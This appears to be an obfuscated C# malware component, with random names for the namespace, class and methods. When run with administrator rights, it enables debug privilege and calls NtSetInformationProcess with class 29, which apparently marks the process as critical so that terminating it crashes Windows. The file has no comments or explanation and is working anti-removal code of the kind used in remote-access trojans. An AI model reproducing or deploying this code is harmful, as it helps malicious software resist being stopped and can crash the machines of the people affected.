using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace VsYjhNTIRPBh;

public static class yDeZOPUKeirePPx
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr iJVsIjwUioR, int lrACWZIMfBNbN, ref int NhIriPumiti, int CUyZWnvtCTJFXU);

	public static void ZxyhQWOZJT()
	{
		if (iZtwJUQedlSQ())
		{
			pRYoYkbTyKaY();
		}
	}

	public static void pRYoYkbTyKaY()
	{
		int NhIriPumiti = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref NhIriPumiti, 4);
	}

	public static bool iZtwJUQedlSQ()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
